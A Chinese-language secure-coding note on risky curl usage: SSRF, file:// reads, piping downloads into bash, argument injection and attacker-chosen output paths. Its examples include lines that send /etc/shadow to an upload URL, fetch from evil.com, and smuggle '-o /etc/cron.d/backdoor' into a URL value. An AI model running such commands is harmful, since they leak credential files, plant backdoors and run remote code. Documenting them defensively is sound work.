# curl 命令安全风险

## 涉及的安全问题
- 命令注入（参数注入）
- 上传下载（SSRF、协议利用、数据泄露）
- 跨目录读写（输出路径可控）
- 完整性校验缺失（下载后直接执行、主机验证绕过）
- 操作任意文件（-o 写入任意路径）

## 高危模式

### 上传下载 — SSRF / 协议利用
```bash
# 用户可控 URL
curl "$USER_URL" -o /tmp/data
# URL = "http://evil.com/backdoor.sh"

# 非 HTTP 协议
curl "ftp://$USER_HOST/$USER_PATH"
curl "tftp://$USER_HOST/get /etc/passwd"
curl "file:///etc/shadow"
# 协议不限 → SSRF / 本地文件读取

# 上传敏感数据
curl -d @/etc/shadow "$UPLOAD_URL"
curl -F "file=@$SENSITIVE_FILE" "$UPLOAD_URL"
```

### 完整性校验缺失 — 下载后直接执行
```bash
curl "$URL" | bash
curl "$URL" | python3
curl -sSL "$URL/install.sh" | bash
source <(curl "$URL")
. <(curl "$URL/env.sh")

# 下载后解压执行
curl "$URL/archive.tar.gz" | tar xz -C /opt/app/

# 下载后写入系统目录
curl "$URL/config" > /etc/app/config
curl "$URL/crontab" -O /etc/cron.d/app
```

### 命令注入 — 参数注入
```bash
# curl 参数注入
curl $URL
# URL = "-o /etc/cron.d/backdoor http://evil.com/payload"
# curl 将 -o 解析为输出选项

# 安全写法
curl -- "$URL"
```

### 操作任意文件 — 输出路径可控
```bash
curl "$URL" -o "$USER_OUTPUT"
# USER_OUTPUT = "/etc/cron.d/backdoor" → 写入任意路径

curl "$URL" --output "$USER_FILE"
```

### 完整性校验缺失 — SSH 主机验证绕过
```bash
# 通过 SSH 隧道时禁用主机验证
curl --proxy "ssh://$HOST" "$URL"
```
